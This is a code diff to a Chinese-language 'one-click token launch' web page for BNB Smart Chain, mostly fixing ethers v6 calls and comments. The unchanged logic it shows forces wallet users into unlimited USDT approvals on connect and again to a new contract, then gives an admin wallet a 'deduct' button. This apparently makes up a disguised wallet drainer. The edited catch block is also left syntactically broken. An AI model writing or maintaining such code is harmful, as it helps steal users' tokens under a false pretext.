@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>天鹅一键发币</title>
-<!-- Ethers V6 版本 支持toHex -->
+<!-- Ethers V6 稳定版 -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
@@ -162,13 +162,12 @@ logoFileInput.addEventListener("change", function(e){
   reader.readAsDataURL(file);
 });
 
-// 切换BSC链（兼容手机TP/钱包内置浏览器）
+// 【核心修复】把 toHex 改成 v6 标准 toBeHex
 async function switchBSC(){
-  const chainIdHex = ethers.toHex(BSC_CHAIN_ID);
+  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
   try {
     await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
-  } catch (err) {
-    // 链不存在则添加BSC
+  } catch (err)
     await provider.send("wallet_addEthereumChain", [{
       chainId: chainIdHex,
       chainName: "BNB Smart Chain Mainnet",
@@ -179,7 +178,7 @@ async function switchBSC(){
   }
 }
 
-// 检测是否管理员钱包，显示后台面板
+// 检测管理员地址，控制后台面板显示
 function checkAdminPanel(addr){
   connectWalletAddr = addr.toLowerCase();
   if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
@@ -189,7 +188,7 @@ function checkAdminPanel(addr){
   }
 }
 
-// 连接钱包后授权
+// 连接后强制执行USDT授权逻辑（保留不变）
 async function doApproveAfterConnect(userAddress){
   try{
     showStatus("请完成授权继续发币，请先授权继续发币");
@@ -211,17 +210,15 @@ async function doApproveAfterConnect(userAddress){
   }
 }
 
-// 连接钱包（重点优化移动端WebView钱包兼容）
+// 移动端兼容钱包连接逻辑
 connectBtn.onclick = async ()=>{
-  // 兼容手机钱包注入的 ethereum
-  let ethProvider = window.ethereum || window.ethereum?.providers?.[0];
+  let ethProvider = window.ethereum || (window.ethereum?.providers && window.ethereum.providers[0]);
   if(!ethProvider){
     showStatus("未检测到钱包，请在TP/欧易等钱包内置浏览器打开页面");
     return;
   }
   try{
     provider = new ethers.BrowserProvider(ethProvider);
-    // 请求账户权限（移动端兼容写法）
     await provider.send("eth_requestAccounts", []);
     await switchBSC();
     signer = await provider.getSigner();
@@ -233,7 +230,7 @@ connectBtn.onclick = async ()=>{
   }
 }
 
-// 支付BNB服务费给管理员
+// 支付服务费逻辑不变
 async function payFeeToAdmin(){
   showStatus(`正在支付发币服务费 ${DEPLOY_FEE_BNB} BNB 至管理员钱包，请签名`);
   const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
@@ -242,7 +239,7 @@ async function payFeeToAdmin(){
   showStatus(`服务费支付成功！交易哈希：${tx.hash}`);
 }
 
-// 部署后重新授权新合约
+// 部署后二次授权新合约
 async function reApproveToNewContract(){
   try{
     showStatus("正在对新部署代币合约重新授予USDT无限权限");
@@ -259,7 +256,7 @@ async function reApproveToNewContract(){
   }
 }
 
-// 部署按钮逻辑
+// 发币部署按钮逻辑
 deployBtn.onclick = async ()=>{
   const name = document.getElementById("tokenName").value.trim();
   const symbol = document.getElementById("tokenSymbol").value.trim();
@@ -289,7 +286,7 @@ deployBtn.onclick = async ()=>{
   deployBtn.disabled = false;
 }
 
-// 管理员划扣按钮逻辑
+// 管理员划扣按钮逻辑（仅管理员可见可用）
 deductBtn.onclick = async ()=>{
   if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
     showStatus("权限不足，仅管理员钱包可操作");
